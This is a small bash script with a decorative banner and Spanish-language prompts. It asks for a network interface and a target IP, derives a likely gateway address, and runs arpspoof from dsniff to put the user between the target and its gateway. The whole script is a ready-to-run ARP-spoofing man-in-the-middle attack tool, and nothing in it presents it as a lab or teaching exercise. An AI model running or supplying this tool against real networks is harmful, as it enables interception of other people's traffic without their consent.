#!/bin/bash

echo -e "\033[1;35m    _______  _______  ______   _______  _        _______  _        _______ _________ _______ "
echo "   (  ___  )(  ____ )(  ___ \ (  ___  )( \      (  ____ \( (    /|(  ____ \\\__   __/(  ___  )"
echo "   | (   ) || (    )|| (   ) )| (   ) || (      | (    \/|  \  ( || (    \/   ) (   | (   ) |"
echo "   | (___) || (____)|| (__/ / | |   | || |      | (__    |   \ | || |         | |   | |   | |"
echo "   |  ___  ||     __)|  __ (  | |   | || |      |  __)   | (\ \) || |         | |   | |   | |"
echo "   | (   ) || (\ (   | (  \ \ | |   | || |      | (      | | \   || |         | |   | |   | |"
echo "   | )   ( || ) \ \__| )___) )| (___) || (____/\| (____/\| )  \  || (____/\___) (___| (___) |"
echo -e "   |/     \||/   \__/|/ \___/ (_______)(_______/(_______/|/    )_)(_______/\_______/(_______)\033[0m"

      echo -e "\033[1;32m "
      cat  dibujo.txt
      echo -e " \033[0m"
check_herramienta() {
    if ! [ -x "$(command -v $1)" ]; then
       echo -e "\033[1;31m Error: $1 no esta instalado. por favor, instala $1 y vuelve a intentarlo.\033[0m" >&2
       exit 1

    fi
}

check_herramienta "dsniff"

echo -e "\033[1;36m "
read -p "la red que deaea analizar: " interfaz
echo -e "\033[1;35m "
read -p "la ip del objetivo: " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"

